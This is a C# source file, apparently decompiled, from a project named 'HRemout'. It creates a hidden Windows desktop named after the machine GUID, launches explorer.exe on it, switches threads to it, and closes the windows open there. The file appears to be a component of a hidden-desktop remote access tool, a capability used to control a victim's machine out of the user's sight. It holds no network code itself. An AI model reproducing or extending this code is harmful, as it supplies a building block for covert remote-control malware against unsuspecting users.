using System;
using System.Runtime.InteropServices;
using System.Threading;
using HRemout.ControlWindow;
using HRemout.EnumWindow;
using HRemout.UserInFo;

namespace HRemout.Desktop;

internal class DesktopApi
{
	public struct STARTUPINFO
	{
		public int cb;

		public string lpReserved;

		public string lpDesktop;

		public string lpTitle;

		public int dwX;

		public int dwY;

		public int dwXSize;

		public int dwYSize;

		public int dwXCountChars;

		public int dwYCountChars;

		public int dwFillAttribute;

		public int dwFlags;

		public short wShowWindow;

		public short cbReserved2;

		public IntPtr lpReserved2;

		public IntPtr hStdInput;

		public IntPtr hStdOutput;

		public IntPtr hStdError;
	}

	public struct PROCESS_INFORMATION
	{
		public IntPtr hProcess;

		public IntPtr hThread;

		public int dwProcessId;

		public int dwThreadId;
	}

	public static IntPtr Desktop;

	private const int NORMAL_PRIORITY_CLASS = 32;

	[DllImport("user32.dll", SetLastError = true)]
	internal static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice, IntPtr pDevmode, int dwFlags, uint dwDesiredAccess, IntPtr lpsa);

	[DllImport("user32.dll", SetLastError = true)]
	internal static extern bool SetThreadDesktop(IntPtr hDesktop);

	[DllImport("kernel32.dll")]
	public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);

	public static bool ProcessCreate(string name, string path, string args)
	{
		try
		{
			PROCESS_INFORMATION lpProcessInformation = default(PROCESS_INFORMATION);
			STARTUPINFO lpStartupInfo = default(STARTUPINFO);
			lpStartupInfo.cb = Marshal.SizeOf((object)lpStartupInfo);
			lpStartupInfo.lpDesktop = name;
			string lpCommandLine = $"\"{path}\" {args}";
			return CreateProcess(path, lpCommandLine, IntPtr.Zero, IntPtr.Zero, bInheritHandles: true, 32, IntPtr.Zero, null, ref lpStartupInfo, ref lpProcessInformation);
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static IntPtr Create(string name)
	{
		Desktop = CreateDesktop(name, IntPtr.Zero, IntPtr.Zero, 0, 511u, IntPtr.Zero);
		exlorerConrol();
		return Desktop;
	}

	public static void killallWindow()
	{
		SetCurrent(Desktop);
		EnumDesktopWindow.GetDesktopWindowHandlesAndTitles(out var handles, out var titles);
		_ = handles.Count;
		foreach (IntPtr item in handles)
		{
			int index = handles.IndexOf(item);
			if (titles[index] != "Program Manager")
			{
				Control.PostMessage(item, 16u, 0, 0);
			}
		}
	}

	private static void exlorerConrol()
	{
		ProcessCreate(GetINFo.GetMachineGuid(), Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "//explorer.exe", null);
		ProcessCreate(GetINFo.GetMachineGuid(), Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "//explorer.exe", null);
		Thread.Sleep(1000);
	}

	public static bool SetCurrent(IntPtr desktop)
	{
		return SetThreadDesktop(desktop);
	}
}
